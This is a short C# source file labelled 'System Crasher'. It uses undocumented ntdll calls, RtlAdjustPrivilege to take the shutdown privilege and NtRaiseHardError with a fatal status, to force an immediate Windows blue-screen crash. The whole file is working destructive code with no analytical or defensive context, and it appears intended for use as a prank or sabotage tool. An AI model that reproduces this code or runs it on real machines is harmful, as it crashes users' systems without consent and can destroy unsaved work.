/*
Powered By SCP-10492
2022.2.11
System Crasher£ºCrasher
*/

using System.Runtime.InteropServices;

namespace Wertsdb
{
    class Crasher
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public static void Main()
        {
            RtlAdjustPrivilege(19, true, false, out bool PreviousValue);
            NtRaiseHardError(3222357268, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
    }
}
